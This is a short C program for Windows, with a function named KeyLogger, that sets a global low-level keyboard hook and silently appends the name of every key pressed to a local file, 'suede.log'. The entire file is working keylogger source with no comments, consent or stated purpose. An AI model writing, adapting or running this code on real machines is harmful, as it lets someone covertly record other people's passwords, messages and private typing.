#include <stdio.h>
#include <windows.h>
HHOOK hKeyHook;

__declspec(dllexport) LRESULT CALLBACK
KeyEvent (int nCode, WPARAM wParam, LPARAM lParam) {
  if (
    (nCode == HC_ACTION) &&
    ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))
  ) {
    KBDLLHOOKSTRUCT * hooked = (KBDLLHOOKSTRUCT *) lParam;
    DWORD dwMsg = 1;
    dwMsg += hooked->scanCode << 16;
    dwMsg += hooked->flags << 24;
    char kn[] = "Windows Right";
    GetKeyNameText(dwMsg, kn, sizeof kn);
    FILE * fpt = fopen("suede.log", "a");
    fprintf(fpt, "_%s", kn);
    fflush(fpt);
  }
  return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

void MsgLoop() {
  MSG mg;
  while (GetMessage(&mg, 0, 0, 0)) {
    TranslateMessage(&mg);
    DispatchMessage(&mg);
  }
}

DWORD WINAPI KeyLogger() {
  HINSTANCE hExe = GetModuleHandle(0);
  hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeyEvent, hExe, 0);
  MsgLoop();
  UnhookWindowsHookEx(hKeyHook);
  return 0;
}

int main() {
  HANDLE thd = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) KeyLogger, 0, 0, 0);
  return WaitForSingleObject(thd, INFINITE);
}
